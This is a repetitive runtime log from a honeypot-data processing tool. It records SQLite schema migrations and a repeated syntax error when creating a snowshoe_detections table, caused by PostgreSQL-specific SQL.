2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,411:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,414:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,422:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,423:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,427:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,428:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,429:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,432:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
